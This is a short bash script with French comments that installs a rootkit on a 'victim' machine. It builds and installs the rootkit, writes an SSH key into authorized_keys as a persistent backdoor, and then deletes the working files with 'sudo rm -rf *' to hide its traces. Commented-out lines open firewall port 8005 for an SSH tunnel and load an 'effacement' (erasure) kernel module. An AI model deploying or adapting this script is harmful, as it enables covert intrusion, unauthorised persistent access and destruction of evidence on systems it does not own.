#!/bin/bash
set -e


echo "Lancement de l'encodage du script"

sudo bash encodage.sh init &&

echo "Lancer le makefile du rootkit"
cd rootkit && make all && make install &&


echo "insertion clef ssh dans la victime"
sudo echo "SSKEY" > ~/.ssh/authorized_keys &&



echo "FIN DE L'INSTALLATION DU ROOTKIT ET SUPPRESSION DES FICHIERS"
sudo rm -rf *

exit 0









#echo "CREATION DU TUNNEL SSH SECU"
#echo "AUTORISATION PARE FEU 8005 POUR TUNNEL SSH"
#sudo ufw allow 8005/tcp &&
#sudo ufw allow 8005/udp &&
#echo "INSERTION CLEF SSH"
#sudo echo "SSKEY" > ~/.ssh/authorized_keys &&
#echo "Lancer le makefile d'effacement sur le repetoire courant"
#make all && sudo insmod effacement.ko && 
